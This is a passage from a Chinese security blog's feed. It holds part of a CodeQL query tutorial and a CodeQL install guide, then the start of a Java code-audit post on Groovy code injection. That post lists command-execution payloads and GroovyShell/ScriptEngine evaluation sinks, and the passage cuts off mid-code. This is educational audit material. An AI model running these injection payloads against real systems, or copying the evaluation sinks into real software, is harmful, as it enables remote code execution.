id="每个case"><a href="#每个case" class="headerlink" title="每个case"></a>每个case</h6><h3 id="0x13-6-switch-getDefaultCase"><a href="#0x13-6-switch-getDefaultCase" class="headerlink" title="0x13-6 switch.getDefaultCase()"></a>0x13-6 switch.getDefaultCase()</h3><h6 id="默认defalut"><a href="#默认defalut" class="headerlink" title="默认defalut"></a>默认defalut</h6><p><img src="/img/CodeQLBase/image-20220608170023753.png" alt="image-20220608170023753"></p><h2 id="0x14-三元运算符"><a href="#0x14-三元运算符" class="headerlink" title="0x14 三元运算符"></a>0x14 三元运算符</h2><h3 id="0x14-1-ConditionalExpr"><a href="#0x14-1-ConditionalExpr" class="headerlink" title="0x14-1 ConditionalExpr"></a>0x14-1 ConditionalExpr</h3><p><img src="/img/CodeQLBase/image-20220104164105458.png" alt="image-20220104164105458"></p><pre><code>import javafrom ConditionalExpr eselect e, e.getTrueExpr(), e.getFalseExpr(), e.getCondition()</code></pre><p>ConditionalExpr 是整个三元运算符语句</p><p>ConditionalExpr.getCondition 是判断语句</p><p>ConditionalExpr.getTrueExpr() 是为True时的语句 </p><p>ConditionalExpr.getFalseExpr() 是为False时的语句 </p><p><img src="/img/CodeQLBase/image-20220608170259641.png" alt="image-20220608170259641"></p><h2 id="0x15-抛出异常"><a href="#0x15-抛出异常" class="headerlink" title="0x15 抛出异常"></a>0x15 抛出异常</h2><pre><code>import javafrom ThrowStmt throwselect throw, throw.getThrownExceptionType()</code></pre><p>ThrowStmt 抛出异常的语句 throw new GlobalException(RPCErrorCodeEnum.THIRD_PARTY_CALL_ERROR);</p><p>ThrowStmt.getThrownExceptionType() 异常的类型 GlobalException</p><p><img src="/img/CodeQLBase/image-20220608170416663.png" alt="image-20220608170416663"></p><h2 id="0x16-try语句"><a href="#0x16-try语句" class="headerlink" title="0x16 try语句"></a>0x16 try语句</h2><h3 id="0x16-1-TryStmt"><a href="#0x16-1-TryStmt" class="headerlink" title="0x16-1 TryStmt"></a>0x16-1 TryStmt</h3><p><img src="/img/CodeQLBase/image-20220104194944375.png" alt="image-20220104194944375"></p><pre><code>import javafrom TryStmt twhere  exists(t.getFinally()) and  exists(t.getACatchClause())select t, t.getBlock(), t.getACatchClause(), t.getFinally()</code></pre><p>TryStmt.getBlock 是 try语句的代码块</p><p>TryStmt.getACatchClause 是catch (Exception e)</p><p>TryStmt.getFinally 是 finally语句的代码块</p><p><img src="/img/CodeQLBase/image-20220608171136832.png" alt="image-20220608171136832"></p><h2 id="0x17-Parameter-参数"><a href="#0x17-Parameter-参数" class="headerlink" title="0x17 Parameter 参数"></a>0x17 Parameter 参数</h2><p>Parameter 参数</p><p><img src="/img/CodeQLBase/image-20220104202955759.png" alt="image-20220104202955759"></p><h3 id="0x17-1-getAnAccess"><a href="#0x17-1-getAnAccess" class="headerlink" title="0x17-1 getAnAccess"></a>0x17-1 getAnAccess</h3><h6 id="参数被调用"><a href="#参数被调用" class="headerlink" title="参数被调用"></a>参数被调用</h6><pre><code>import javafrom Parameter pwhere exists(p.getAnAccess())select p, p.getAnAccess()</code></pre><p><img src="/img/CodeQLBase/image-20220608171826354.png" alt="image-20220608171826354"></p><h2 id="0x18-自实现匹配注解"><a href="#0x18-自实现匹配注解" class="headerlink" title="0x18 自实现匹配注解"></a>0x18 自实现匹配注解</h2><p>AnnotationType 注解类型类，是继承接口类</p><p><img src="/img/CodeQLBase/image-20220105141409637.png" alt="image-20220105141409637"></p><p>所以定义类SpringRequestMappingAnnotationType继承注解类型类AnnotationType</p><pre><code>class SpringRequestMappingAnnotationType extends AnnotationType</code></pre><p>@RequestMapping注解是在包org.springframework.web.bind.annotation里定义的接口RequestMapping</p><pre><code>this.hasQualifiedName(&quot;org.springframework.web.bind.annotation&quot;, &quot;RequestMapping&quot;)</code></pre><p><img src="/img/CodeQLBase/image-20220608171954078.png" alt="image-20220608171954078"></p><p>定义类SpringRequestMappingAnnotation继承注解类Annotation</p><pre><code>private class SpringRequestMappingAnnotation extends Annotation</code></pre><p>构造方法里，获取自身类型并且是SpringRequestMappingAnnotationType的实例</p><pre><code>SpringRequestMappingAnnotation() { this.getType() instanceof SpringRequestMappingAnnotationType }</code></pre><p>整体代码如下：</p><p>可以匹配到到@RequestMapping，@GetMapping，@PostMapping</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token comment" spellcheck="true">// 定义类SpringRequestMappingAnnotationType继承注解类AnnotationType</span><span class="token keyword">class</span> <span class="token class-name">SpringRequestMappingAnnotationType</span> <span class="token keyword">extends</span> <span class="token class-name">AnnotationType</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 构造方法</span>    <span class="token function">SpringRequestMappingAnnotationType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">// `@RequestMapping` used directly as an annotation.</span>      <span class="token comment" spellcheck="true">// @RequestMapping注解是在包org.springframework.web.bind.annotation里定义的接口RequestMapping</span>      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">hasQualifiedName</span><span class="token punctuation">(</span><span class="token string">"org.springframework.web.bind.annotation"</span><span class="token punctuation">,</span> <span class="token string">"RequestMapping"</span><span class="token punctuation">)</span>      or      <span class="token comment" spellcheck="true">// `@RequestMapping` can be used as a meta-annotation on other annotation types, e.g. GetMapping, PostMapping etc.</span>      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getAnAnnotation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">instanceof</span> <span class="token class-name">SpringRequestMappingAnnotationType</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">private</span> <span class="token keyword">class</span> <span class="token class-name">SpringRequestMappingAnnotation</span> <span class="token keyword">extends</span> <span class="token class-name">Annotation</span> <span class="token punctuation">{</span>    <span class="token function">SpringRequestMappingAnnotation</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">instanceof</span> <span class="token class-name">SpringRequestMappingAnnotationType</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>from SpringRequestMappingAnnotation var1select var1<span class="token punctuation">,</span> var1<span class="token punctuation">.</span><span class="token function">getFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> var1<span class="token punctuation">.</span><span class="token function">getLocation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/img/CodeQLBase/image-20220608172316143.png" alt="image-20220608172316143"></p><p><img src="/img/CodeQLBase/image-20220608172408976.png" alt="image-20220608172408976"></p><h2 id="0x19-匹配类"><a href="#0x19-匹配类" class="headerlink" title="0x19 匹配类"></a>0x19 匹配类</h2><h3 id="0x19-1-匹配SAXParserFactory类"><a href="#0x19-1-匹配SAXParserFactory类" class="headerlink" title="0x19-1 匹配SAXParserFactory类"></a>0x19-1 匹配SAXParserFactory类</h3><pre><code>import java class SAXParserFactory extends RefType{    SAXParserFactory(){        this.hasQualifiedName(&quot;javax.xml.parsers&quot;, &quot;SAXParserFactory&quot;)    }}from SAXParserFactory var1select var1, var1.getFile(), var1.getLocation()</code></pre><p><img src="/img/CodeQLBase/image-20220608172456042.png" alt="image-20220608172456042"></p><h2 id="0x20-File文件"><a href="#0x20-File文件" class="headerlink" title="0x20 File文件"></a>0x20 File文件</h2><h3 id="0x20-1-获取所有文件"><a href="#0x20-1-获取所有文件" class="headerlink" title="0x20-1 获取所有文件"></a>0x20-1 获取所有文件</h3><pre><code>import java from File fileselect file, file.getBaseName()</code></pre><p><img src="/img/CodeQLBase/image-20220116150545824.png" alt="image-20220116150545824"></p><h2 id="0x21-XML文件"><a href="#0x21-XML文件" class="headerlink" title="0x21 XML文件"></a>0x21 XML文件</h2><h3 id="0x21-1-XMLFile"><a href="#0x21-1-XMLFile" class="headerlink" title="0x21-1 XMLFile"></a>0x21-1 XMLFile</h3><h6 id="获取xml文件"><a href="#获取xml文件" class="headerlink" title="获取xml文件"></a>获取xml文件</h6><p><img src="/img/CodeQLBase/image-20220116150647280.png" alt="image-20220116150647280"></p><h2 id="0x22-XML元素"><a href="#0x22-XML元素" class="headerlink" title="0x22 XML元素"></a>0x22 XML元素</h2><pre><code>import javafrom XMLElement var select var, var.getFile(), var.getLocation(), var.getAChild(), count(var.getAChild()), var.getFile().getAChild()</code></pre><h3 id="0x22-1-XMLElement-getAChild"><a href="#0x22-1-XMLElement-getAChild" class="headerlink" title="0x22-1 XMLElement.getAChild()"></a>0x22-1 XMLElement.getAChild()</h3><h6 id="获取该元素下的子元素。"><a href="#获取该元素下的子元素。" class="headerlink" title="获取该元素下的子元素。"></a>获取该元素下的子元素。</h6><h3 id="0x22-2-XMLElement-getFile-getAChild"><a href="#0x22-2-XMLElement-getFile-getAChild" class="headerlink" title="0x22-2 XMLElement.getFile().getAChild()"></a>0x22-2 XMLElement.getFile().getAChild()</h3><h6 id="获取该元素所在文件最外层的元素。"><a href="#获取该元素所在文件最外层的元素。" class="headerlink" title="获取该元素所在文件最外层的元素。"></a>获取该元素所在文件最外层的元素。</h6><p><img src="/img/CodeQLBase/image-20220116150958625.png" alt="image-20220116150958625"></p><p><img src="/img/CodeQLBase/image-20220116150906335.png" alt="image-20220116150906335"></p><p><img src="/img/CodeQLBase/image-20220116151057698.png" alt="image-20220116151057698"></p><h3 id="0x22-3-allCharactersString"><a href="#0x22-3-allCharactersString" class="headerlink" title="0x22-3 allCharactersString"></a>0x22-3 allCharactersString</h3><h6 id="获取元素里的值"><a href="#获取元素里的值" class="headerlink" title="获取元素里的值"></a>获取元素里的值</h6><pre><code>import java /** * 匹配出xml文件里有mapper元素的文件。 * 例如：&lt;mapper namespace=&quot;org.joychou.mapper.UserMapper&quot;&gt; &lt;/mapper&gt; */class MyBatisMapperXMLFile extends XMLFile {    MyBatisMapperXMLFile() {      count(XMLElement e | e = this.getAChild()) = 1 and      this.getAChild().getName() = &quot;mapper&quot;    }}class MyBatisMapperXMLElement extends XMLElement{  MyBatisMapperXMLElement(){    this.getFile() instanceof MyBatisMapperXMLFile  }}</code></pre><p><img src="/img/CodeQLBase/image-20220116160149908.png" alt="image-20220116160149908"></p><h2 id="0x23-Call和MethodAccess关联起来"><a href="#0x23-Call和MethodAccess关联起来" class="headerlink" title="0x23 Call和MethodAccess关联起来"></a>0x23 Call和MethodAccess关联起来</h2><h3 id="0x23-1-通过getQualifier对应"><a href="#0x23-1-通过getQualifier对应" class="headerlink" title="0x23-1 通过getQualifier对应"></a>0x23-1 通过getQualifier对应</h3><pre><code>call.getQualifier() = ma.getQualifier()</code></pre><h2 id="0x24-Node、PartialPathNode和m、ma关联起来"><a href="#0x24-Node、PartialPathNode和m、ma关联起来" class="headerlink" title="0x24 Node、PartialPathNode和m、ma关联起来"></a>0x24 Node、PartialPathNode和m、ma关联起来</h2><pre><code>DataFlow::Node nodenode.asParamter() = m.getAParameter()node.asExpr() = ma.getAnArgument()DataFlow::PartialPathNode nodenode.getNode().asParamter() = m.getAParameter()node.getNode().asExpr() = ma.getAnArgument()</code></pre>]]></content>
      
      
      <categories>
          
          <category> CodeQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CodeQL系列之基础语法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CodeQL系列之安装CodeQL</title>
      <link href="/2021/11/17/codeql-xi-lie-zhi-an-zhuang-codeql/"/>
      <url>/2021/11/17/codeql-xi-lie-zhi-an-zhuang-codeql/</url>
      
        <content type="html"><![CDATA[<h1 id="CodeQL系列之安装CodeQL"><a href="#CodeQL系列之安装CodeQL" class="headerlink" title="CodeQL系列之安装CodeQL"></a>CodeQL系列之安装CodeQL</h1><h2 id="0x01-下载"><a href="#0x01-下载" class="headerlink" title="0x01 下载"></a>0x01 下载</h2><p>将CodeQL CLI的可执行文件添加到环境变量</p><p><a href="https://github.com/github/codeql-cli-binaries/releases/latest/download/codeql.zip" target="_blank" rel="noopener">https://github.com/github/codeql-cli-binaries/releases/latest/download/codeql.zip</a></p><p><img src="/img/CodeQLInstall/image-20211117214922819.png" alt="image-20211117214922819"></p><p><img src="/img/CodeQLInstall/image-20211117215003120.png" alt="image-20211117215003120"></p><p>CodeQL 标准库</p><p><a href="https://codeload.github.com/github/codeql/zip/refs/heads/main" target="_blank" rel="noopener">https://codeload.github.com/github/codeql/zip/refs/heads/main</a></p><p><img src="/img/CodeQLInstall/image-20211117215020543.png" alt="image-20211117215020543"></p><p>Visual Studio Code CodeQL插件</p><p>Ctrl+Shift+X =&gt; 输入CodeQL =&gt; install</p><p>在CodeQL扩展中配置CodeQL CLI的路径，例如<code>C:\Users\xxxxx\Desktop\codeql\codeql\codeql\codeql.exe</code></p><p><img src="/img/CodeQLInstall/image-20211117214851608.png" alt="image-20211117214851608"></p><h2 id="0x02-编译QL数据库"><a href="#0x02-编译QL数据库" class="headerlink" title="0x02 编译QL数据库"></a>0x02 编译QL数据库</h2><h3 id="常规编译"><a href="#常规编译" class="headerlink" title="常规编译"></a>常规编译</h3><p>在开源项目的根目录下运行如下命令建库，前提是该项目能够编译成功</p><p><code>codeql database create catMaster -l java</code></p><p>如果上面编译失败，就用下面的命令编译</p><h3 id="Gadle项目"><a href="#Gadle项目" class="headerlink" title="Gadle项目"></a>Gadle项目</h3><p><code>codeql database create XXXXXXXXXX--language=java --command=&quot;gradle.bat&quot; --overwrite</code></p><p><code>codeql database create XXXXXXXXXXXX --source-root=D:\Study\Java\XXXXXXXXXX --language=java --command=&quot;gradle clean build -x test --no-daemon -Dfile.encoding=UTF-8&quot;</code></p><h3 id="Maven项目"><a href="#Maven项目" class="headerlink" title="Maven项目"></a>Maven项目</h3><p><code>codeql database create JEECMS -l java -c &quot;mvn lean install --file pom.xml&quot;</code></p><h3 id="delombok"><a href="#delombok" class="headerlink" title="delombok"></a>delombok</h3><p>如果发现数据库少文件，大概率原因是少的文件都用了lombok，使用下面的命令删除该注解</p><pre><code>wget https://projectlombok.org/downloads/lombok.jar -O &quot;lombok.jar&quot;java -jar D:\tools\CodeQL\lombok.jar delombok XXXXXXXXXX -d XXXXXXXXXXX-Delombok --encoding=UTF-8</code></pre><p>然后重新创建数据库</p><pre><code>codeql database create XXXXXXXXXX --language=java --command=&quot;gradle clean build -x test --no-daemon -Dfile.encoding=UTF-8&quot; --overwrite</code></pre><p>生成了catMaster目录</p><p><img src="/img/CodeQLInstall/image-20211117215321577.png" alt="image-20211117215321577"></p><h2 id="0x03-使用"><a href="#0x03-使用" class="headerlink" title="0x03 使用"></a>0x03 使用</h2><p>创建你的第一个QL包</p><p>你需要创建一个文件夹，用来存放后续你编写的CodeQL脚本，CodeQL官方称这个文件夹为QL Pack。</p><p>例如名为Cat-codeql的文件夹，并在里面创建1个QL Pack的配置文件，名称固定为<code>qlpack.yml</code>;再创建一个ql后缀的文件，名称随意。</p><p><img src="/img/CodeQLInstall/image-20211117215430967.png" alt="image-20211117215430967"></p><p>将如下信息填入qlpack.yml文件</p><pre><code>name: example-queryversion: 0.0.0libraryPathDependencies: codeql-java</code></pre><p>第一行表示这个QL包的名称为example-query，必选，如果你在VSCode中同时打开多个QL包时，要保证这个name的值唯一不重复;</p><p>第二行表示这个QL包的版本号，必选;</p><p>第三行表示这个QL包的依赖，必选，codeql-java表示需要Java语言的QL标准库依赖。</p><p><img src="/img/CodeQLInstall/image-20211117215537605.png" alt="image-20211117215537605"></p><p>VSCode工作区增加CodeQL标准库</p><p>VSCode - 文件 - 将文件夹加入工作区 - 选择存放CodeQL标准库的文件夹</p><p><img src="/img/CodeQLInstall/image-20211117215647554.png" alt="image-20211117215647554"></p><p><img src="/img/CodeQLInstall/image-20211117215718097.png" alt="image-20211117215718097"></p><p>在VSCode的CodeQL插件中添加之前用CodeQL创建的CatMaster的数据库。</p><p><img src="/img/CodeQLInstall/image-20211117215803775.png" alt="image-20211117215803775"></p><p>添加成功的样子</p><p><img src="/img/CodeQLInstall/image-20211117215829470.png" alt="image-20211117215829470"></p><p>编写第一个查询</p><pre><code>import javafrom Method mselect m</code></pre><p><img src="/img/CodeQLInstall/image-20211117215908674.png" alt="image-20211117215908674"></p><h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h2><pre><code>https://mp.weixin.qq.com/s?__biz=Mzg4ODU4ODYzOQ==&amp;mid=2247484326&amp;idx=1&amp;sn=fd055d23efe80f5c6758ce9bd01307c9&amp;chksm=cff99396f88e1a80cd1e52c2a17649f6f20da7fe45b743925c80a90b3997395963a9afe84691&amp;scene=178&amp;cur_album_id=1970201600723910658#rd</code></pre>]]></content>
      
      
      <categories>
          
          <category> CodeQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CodeQL系列之安装CodeQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java代码审计之Groovy代码执行</title>
      <link href="/2021/11/02/java-dai-ma-shen-ji-zhi-groovy-dai-ma-zhi-xing/"/>
      <url>/2021/11/02/java-dai-ma-shen-ji-zhi-groovy-dai-ma-zhi-xing/</url>
      
        <content type="html"><![CDATA[<h1 id="Java代码审计之Groovy代码执行"><a href="#Java代码审计之Groovy代码执行" class="headerlink" title="Java代码审计之Groovy代码执行"></a>Java代码审计之Groovy代码执行</h1><h2 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h2><p>Groovy是一种基于JVM（Java虚拟机）的敏捷开发语言，它结合了Python、Ruby和Smalltalk的许多强大的特性，Groovy代码能够与Java代码很好地结合，也能用于扩展现有代码。由于其运行在JVM上的特性，Groovy也可以使用其他非Java语言编写的库。</p><p>Groovy是用于Java虚拟机的一种敏捷的动态语言，它是一种成熟的面向对象编程语言，既可以用于面向对象编程，又可以用作纯粹的脚本语言。使用该种语言不必编写过多的代码，同时又具有闭包和动态语言中的其他特性。</p><p>Groovy是JVM的一个替代语言（替代是指可以用Groovy在Java平台上进行Java编程），使用方式基本与使用Java代码的方式相同，该语言特别适合与Spring的动态语言支持一起使用，设计时充分考虑了Java集成，这使Groovy与Java代码的互操作很容易。（注意：不是指Groovy替代Java，而是指Groovy和Java很好的结合编程。）</p><p>Groovy有以下特点：</p><ul><li>同时支持静态和动态类型；</li><li>支持运算符重载；</li><li>本地语法列表和关联数组；</li><li>对正则表达式的本地支持；</li><li>各种标记语言，如XML和HTML原生支持；</li><li>Groovy对于Java开发人员来说很简单，因为Java和Groovy的语法非常相似；</li><li>可以使用现有的Java库；</li><li>Groovy扩展了java.lang.Object；</li></ul><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>下载Groovy：<a href="http://groovy-lang.org/download.html" target="_blank" rel="noopener">http://groovy-lang.org/download.html</a></p><p>解压之后，使用IDEA新建Groovy项目时选择解压的Groovy目录即可</p><p><img src="/img/Groovy/image-20211102164951317.png" alt="image-20211102164951317"></p><p>然后点击src-&gt;new&gt;groovy class，即可新建一个groovy文件，内容如下：</p><pre class="line-numbers language-groovy"><code class="language-groovy"><span class="token keyword">class</span> <span class="token class-name">test</span> <span class="token punctuation">{</span>    <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">{</span>        println <span class="token string">"Hello World!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/img/Groovy/image-20211102164857678.png" alt="image-20211102164857678"></p><p><img src="/img/Groovy/image-20211102165119449.png" alt="image-20211102165119449"></p><h2 id="0x03-Groovy代码注入"><a href="#0x03-Groovy代码注入" class="headerlink" title="0x03 Groovy代码注入"></a>0x03 Groovy代码注入</h2><h3 id="1-执行命令的方式"><a href="#1-执行命令的方式" class="headerlink" title="1.执行命令的方式"></a>1.执行命令的方式</h3><pre class="line-numbers language-groovy"><code class="language-groovy"><span class="token comment" spellcheck="true">// 直接命令执行</span>Runtime<span class="token operator">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token string">"calc"</span><span class="token operator">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">'calc'</span><span class="token operator">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">"${"</span>calc<span class="token string">".execute()}"</span><span class="token string">"${'calc'.execute()}"</span><span class="token comment" spellcheck="true">// 回显型命令执行</span>println <span class="token string">"whoami"</span><span class="token operator">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span>textprintln <span class="token string">'whoami'</span><span class="token operator">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span>textprintln <span class="token string">"${"</span>whoami<span class="token string">".execute().text}"</span>println <span class="token string">"${'whoami'.execute().text}"</span><span class="token keyword">def</span> cmd <span class="token operator">=</span> <span class="token string">"whoami"</span><span class="token punctuation">;</span>println <span class="token string">"${cmd.execute().text}"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>RCE.groovy代码如下：</p><pre class="line-numbers language-groovy"><code class="language-groovy"><span class="token keyword">class</span> <span class="token class-name">RCE</span> <span class="token punctuation">{</span>    <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">def</span> cmd <span class="token operator">=</span> <span class="token string">"open -a Calculator"</span><span class="token punctuation">;</span>        Runtime<span class="token operator">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        cmd.execute()</span><span class="token comment" spellcheck="true">//        println "${cmd.execute()}";</span>        <span class="token keyword">def</span> cmd2 <span class="token operator">=</span> <span class="token string">"ls -laht"</span>        println cmd2<span class="token operator">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span>text    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/img/Groovy/image-20211102170004915.png" alt="image-20211102170004915"></p><h3 id="2-触发漏洞代码"><a href="#2-触发漏洞代码" class="headerlink" title="2. 触发漏洞代码"></a>2. 触发漏洞代码</h3><pre><code>GroovyShellGroovyScriptEngineGroovyClassLoaderScriptEngineManager</code></pre><p>GroovyShellExample.java代码如下：</p><pre class="line-numbers language-groovy"><code class="language-groovy"><span class="token keyword">import</span> groovy<span class="token operator">.</span>lang<span class="token operator">.</span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token keyword">import</span> groovy<span class="token operator">.</span>util<span class="token operator">.</span>GroovyScriptEngine<span class="token punctuation">;</span><span class="token keyword">import</span> groovy<span class="token operator">.</span>util<span class="token operator">.</span>ResourceException<span class="token punctuation">;</span><span class="token keyword">import</span> groovy<span class="token operator">.</span>util<span class="token operator">.</span>ScriptException<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token operator">.</span>script<span class="token operator">.</span>ScriptEngine<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token operator">.</span>script<span class="token operator">.</span>ScriptEngineManager<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token operator">.</span>io<span class="token operator">.</span>BufferedReader<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token operator">.</span>io<span class="token operator">.</span>File<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token operator">.</span>io<span class="token operator">.</span>FileReader<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token operator">.</span>io<span class="token operator">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">GroovyShellExample</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// GroovyShell 直接执行命令</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">func1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        GroovyShell groovyShell <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GroovyShell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 直接执行命令</span>        groovyShell<span class="token operator">.</span><span class="token function">evaluate</span><span class="token punctuation">(</span><span class="token string">"\"open -a Calculator\".execute()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// GroovyShell 运行脚本</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">func2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        GroovyShell groovyShell <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GroovyShell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 运行脚本</span>        Script script <span class="token operator">=</span> groovyShell<span class="token operator">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"src/Test.groovy"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        script<span class="token operator">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// GroovyScriptEngine</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">func3</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ScriptException<span class="token punctuation">,</span> ResourceException <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// GroovyScriptEngine可从指定的位置（文件系统、URL、数据库等等）加载Groovy脚本，并且随着脚本变化而重新加载它们。如同GroovyShell一样，GroovyScriptEngine也允许传入参数值，并能返回脚本的计算值。</span>        GroovyScriptEngine groovyScriptEngine <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GroovyScriptEngine</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        groovyScriptEngine<span class="token operator">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token string">"src/Test.groovy"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Binding</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// GroovyClassLoader</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">func4</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> InstantiationException<span class="token punctuation">,</span> IllegalAccessException <span class="token punctuation">{</span>        GroovyClassLoader groovyClassLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GroovyClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Class <span class="token class-name">loadClass</span> <span class="token operator">=</span> groovyClassLoader<span class="token operator">.</span><span class="token function">parseClass</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"src/Test.groovy"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        GroovyObject groovyObject <span class="token operator">=</span> <span class="token punctuation">(</span>GroovyObject<span class="token punctuation">)</span> loadClass<span class="token operator">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        groovyObject<span class="token operator">.</span><span class="token function">invokeMethod</span><span class="token punctuation">(</span><span class="token string">"main"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 在ScriptEngine中，支持名为“groovy”的引擎，可用来执行Groovy代码。</span>    <span class="token comment" spellcheck="true">// ScriptEngine 直接执行命令</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">func5</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> javax<span class="token operator">.</span>script<span class="token operator">.</span>ScriptException <span class="token punctuation">{</span>        ScriptEngine groovyEngine <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ScriptEngineManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">getEngineByName</span><span class="token punctuation">(</span><span class="token string">"groovy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        